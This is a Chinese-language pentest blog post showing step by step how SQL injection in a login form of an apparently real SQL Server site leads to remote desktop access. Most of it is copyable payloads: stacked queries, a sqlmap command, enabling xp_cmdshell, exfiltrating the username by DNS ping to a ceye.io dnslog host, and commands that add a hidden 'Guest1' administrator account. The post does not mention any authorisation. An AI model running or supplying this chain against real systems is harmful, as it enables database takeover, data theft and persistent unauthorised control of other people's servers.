---
date: 2019-06-25 17:01:53
title: 从 SQL Server 注入到 远程连接桌面
description: 从 SQL Server 注入到 远程连接桌面
categories:
  - Pentest
tags:
  - SQL注入
---

### 0x00 目标情况
* 只有一个登录框

### 0x01 发现注入
简单看了下登陆框，可以爆破用户名

![50](/img/post/Xnip2019-06-25_09-42-33.png)
![50](/img/post/Xnip2019-06-25_09-43-33.png)

加单引号后报错，试了试 and 1=1 确实存在注入

![60](/img/post/Xnip2019-06-25_09-45-03.png)
![50](/img/post/Xnip2019-06-25_09-46-06.png)

### 0x01 进一步测试
尝试得到数据版本: ```admin' and @@version=1--```
![60](/img/post/Xnip2019-06-25_09-49-45.png)

抓包 sqlmap 跑了下发现不行: ```sqlmap -r 1.txt --risk 3 --level 3 --dbms "Microsoft SQL Server" --second-order "http://123.xxx.xxx.180:2001/error.aspx"```

返回: all tested parameters appear to be not injectable，跑不出来，只能手工了

看下能不能多语句执行: ```admin';select convert(int,(select user));--```

结果发现可以执行成功，能进行多语句执行
![60](/img/post/Xnip2019-06-25_09-56-08.png)


### 0x02 尝试多语句执行添加用户
* 查看是否有 xp_cmdshell  
Payload：```admin';if(1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')) WAITFOR DELAY '0:0:5';--```
![60](/img/post/Xnip2019-06-25_10-05-25.png)

* 开启 xp_cmdshell  
Payload：```admin';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--```
![50](/img/post/Xnip2019-06-25_10-07-41.png)

* 查看 whoami  
Payload：```admin';exec master..xp_cmdshell 'ping %USERNAME%.vxxxx9.ceye.io';--```
![50](/img/post/Xnip2019-06-25_10-10-38.png)
在 dnslog 可以看到是 SYSTEM 权限，可以直接添加用户
![60](/img/post/Xnip2019-06-25_10-16-37.png)

* 添加用户  
看了下端口，3389开着

```bash
➜  sudo nmap -sS -Pn -n -p3389 123.xxx.xxx.180
Password:
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-25 09:30 CST
Nmap scan report for 123.xxx.xxx.180
Host is up.

PORT     STATE    SERVICE
3389/tcp open     ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
```

直接添加用户: ```admin';exec master..xp_cmdshell 'net user Guest1 Aa123456. /add & net localgroup administrators Guest1 /add & net user Guest1 /active:yes'--```，尝试登陆
![60](/img/post/Xnip2019-06-25_10-22-58.png)











